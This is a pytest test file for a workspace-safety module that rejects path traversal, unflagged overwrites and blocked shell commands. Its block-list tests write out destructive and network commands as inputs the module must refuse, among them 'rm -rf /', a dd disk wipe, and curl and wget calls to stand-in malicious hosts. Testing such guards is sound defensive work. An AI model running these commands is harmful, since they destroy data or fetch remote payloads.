"""
Tests for forge.safety — workspace boundary enforcement.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from forge.safety import (
    SafetyError,
    assert_safe_command,
    assert_safe_write,
    assert_within_workspace,
    is_within_workspace,
    split_command,
)


class TestIsWithinWorkspace:
    """is_within_workspace() predicate tests."""

    def test_file_inside_workspace(self, tmp_path):
        child = tmp_path / "subdir" / "file.py"
        assert is_within_workspace(child, workspace_root=tmp_path) is True

    def test_workspace_root_itself(self, tmp_path):
        assert is_within_workspace(tmp_path, workspace_root=tmp_path) is True

    def test_file_outside_workspace(self, tmp_path):
        outside = tmp_path.parent / "other_project" / "secret.py"
        assert is_within_workspace(outside, workspace_root=tmp_path) is False

    def test_relative_path_inside(self, tmp_path):
        # Relative path resolved against workspace root
        assert is_within_workspace("src/main.py", workspace_root=tmp_path) is True

    def test_parent_traversal_rejected(self, tmp_path):
        traversal = tmp_path / ".." / "etc" / "passwd"
        assert is_within_workspace(traversal, workspace_root=tmp_path) is False

    def test_deeply_nested_path_inside(self, tmp_path):
        deep = tmp_path / "a" / "b" / "c" / "d" / "e.txt"
        assert is_within_workspace(deep, workspace_root=tmp_path) is True


class TestAssertWithinWorkspace:
    """assert_within_workspace() raises SafetyError on violations."""

    def test_returns_resolved_path(self, tmp_path):
        child = tmp_path / "foo.py"
        result = assert_within_workspace(child, workspace_root=tmp_path)
        assert result == child.resolve()

    def test_raises_for_outside_path(self, tmp_path):
        outside = tmp_path.parent / "intruder.py"
        with pytest.raises(SafetyError, match="outside workspace"):
            assert_within_workspace(outside, workspace_root=tmp_path)

    def test_operation_in_error_message(self, tmp_path):
        outside = tmp_path.parent / "bad.py"
        with pytest.raises(SafetyError, match="delete"):
            assert_within_workspace(outside, workspace_root=tmp_path, operation="delete")

    def test_relative_path_resolved(self, tmp_path):
        result = assert_within_workspace("hello/world.txt", workspace_root=tmp_path)
        assert result == (tmp_path / "hello" / "world.txt").resolve()


class TestAssertSafeWrite:
    """assert_safe_write() enforces overwrite guard."""

    def test_new_file_allowed(self, tmp_path):
        path = tmp_path / "new_file.py"
        result = assert_safe_write(path, workspace_root=tmp_path)
        assert result == path.resolve()

    def test_existing_file_blocked_without_flag(self, tmp_path):
        existing = tmp_path / "existing.py"
        existing.write_text("hello")
        with pytest.raises(SafetyError, match="allow_overwrite"):
            assert_safe_write(existing, workspace_root=tmp_path)

    def test_existing_file_allowed_with_flag(self, tmp_path):
        existing = tmp_path / "existing.py"
        existing.write_text("hello")
        result = assert_safe_write(existing, allow_overwrite=True, workspace_root=tmp_path)
        assert result == existing.resolve()

    def test_outside_path_blocked(self, tmp_path):
        outside = tmp_path.parent / "sneaky.py"
        with pytest.raises(SafetyError):
            assert_safe_write(outside, workspace_root=tmp_path)


class TestAssertSafeCommand:
    """assert_safe_command() blocks dangerous executables."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "sudo apt-get install something",
        "curl https://evil.com",
        "wget http://malicious.com/payload",
        "dd if=/dev/zero of=/dev/sda",
        "format C:",
        "shutdown -h now",
        "del important_file.py",
    ])
    def test_blocked_commands_raise(self, cmd):
        with pytest.raises(SafetyError, match="blocked list"):
            assert_safe_command(cmd)

    @pytest.mark.parametrize("cmd", [
        "python forge/cli.py",
        "pytest tests/",
        "git status",
        "ls -la",
        "echo hello",
    ])
    def test_safe_commands_pass(self, cmd):
        result = assert_safe_command(cmd)
        assert isinstance(result, list)
        assert len(result) > 0

    def test_empty_command_raises(self):
        with pytest.raises(SafetyError, match="Empty"):
            assert_safe_command("")

    def test_list_input_accepted(self):
        result = assert_safe_command(["python", "-m", "pytest"])
        assert result == ["python", "-m", "pytest"]

    def test_returns_token_list(self):
        result = assert_safe_command("python -c 'print(1)'")
        assert result[0] == "python"


class TestExeSuffixHandling:
    """Regression: argv[0] suffix must be removed as a suffix, not a char set.

    The old code used ``str.rstrip('.exe')`` which strips the *characters*
    '.', 'e', 'x' from the right — mangling names like ``npx`` -> ``np`` and
    ``tox`` -> ``to`` and letting some blocked names slip through / good names
    get corrupted.
    """

    @pytest.mark.parametrize("cmd", ["npx create-app", "tox -e py311", "pex --help"])
    def test_non_blocked_names_ending_in_exe_chars_pass(self, cmd):
        result = assert_safe_command(cmd)
        assert result[0] == cmd.split()[0]

    def test_rm_exe_still_blocked(self):
        with pytest.raises(SafetyError, match="blocked list"):
            assert_safe_command("rm.exe -rf .")

    def test_curl_exe_still_blocked(self):
        with pytest.raises(SafetyError, match="blocked list"):
            assert_safe_command("CURL.EXE http://example.com")

    def test_plain_exe_token_not_treated_as_empty(self):
        # basename 'foo.exe' -> 'foo', not '' — so it is not blocked.
        result = assert_safe_command("foo.exe --bar")
        assert result[0] == "foo.exe"


class TestSplitCommand:
    """split_command() keeps quoted args and (on Windows) backslash paths."""

    def test_quoted_python_oneliner(self):
        tokens = split_command('python -c "print(1 + 2)"')
        assert tokens[0] == "python"
        assert tokens[1] == "-c"
        assert tokens[2] == "print(1 + 2)"

    def test_windows_backslash_path_preserved(self):
        # Only asserts the meaningful behaviour on the platform under test;
        # on POSIX a backslash path is a legal (if unusual) single token too.
        tokens = split_command(r'C:\Python\python.exe -c "print(1)"')
        assert "\\" in tokens[0] or tokens[0].endswith("python.exe")
        assert tokens[-1] == "print(1)"
